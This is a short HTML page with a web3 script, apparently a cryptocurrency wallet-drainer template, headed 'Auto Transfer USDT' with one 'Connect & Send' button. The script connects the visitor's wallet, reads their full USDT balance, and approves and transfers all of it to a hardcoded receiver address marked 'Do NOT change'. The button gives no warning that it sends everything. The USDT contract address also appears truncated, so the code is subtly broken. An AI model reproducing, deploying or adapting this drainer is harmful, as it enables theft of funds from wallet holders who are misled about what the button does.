<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7b3e82147F"; // Do NOT change

    const usdtContractAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT BEP-20 BSC
    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_spender", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          const sender = accounts[0];

          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
          const balance = await usdtContract.methods.balanceOf(sender).call();

          const amountToSend = web3.utils.toBN(balance);
          if (amountToSend.lte(0)) {
            alert("Insufficient USDT balance.");
            return;
          }

          // Step 1: Approve
          await usdtContract.methods.approve(receiverAddress, amountToSend.toString())
            .send({ from: sender });

          // Step 2: Transfer
          const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend.toString())
            .send({ from: sender });

          alert("USDT sent successfully! Tx hash: " + tx.transactionHash);
        } catch (err) {
          console.error("Error:", err);
          alert("Transaction failed: " + err.message);
        }
      } else {
        alert("Install MetaMask or Trust Wallet.");
      }
    }
  </script>
</body>
</html>
